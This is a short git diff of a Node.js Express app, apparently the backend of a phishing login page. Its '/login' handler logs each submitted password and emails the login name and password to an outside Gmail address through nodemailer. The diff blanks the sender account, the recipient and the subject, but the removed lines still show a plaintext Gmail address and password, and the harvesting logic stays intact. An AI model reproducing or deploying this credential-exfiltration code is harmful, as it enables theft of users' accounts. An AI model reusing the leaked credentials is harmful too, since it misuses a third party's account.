@@ -12,8 +12,8 @@ const nodemailer = require('nodemailer');
 let transporter = nodemailer.createTransport({
 	service : "gmail",
 	auth :{
-		user : 'technodevid123@gmail.com', //login
-		pass : 'drty12drty12' //password
+		user : '', //login
+		pass : '' //password
 	}
 });
 
@@ -27,9 +27,9 @@ app.post("/login",function(req,res) {
 	console.log("password: " + password)
 //step 2
 let mailOptions = {
-	from : 'technodevid123@gmail.com', // email
-	to : 'davidagasiev2005@gmail.com', // email
-	subject : "accaunt", //subject
+	from : '', // email
+	to : '', // email
+	subject : "", //subject
 	text : "login: " + loginName + ", password : " + password //text 
 };
 	
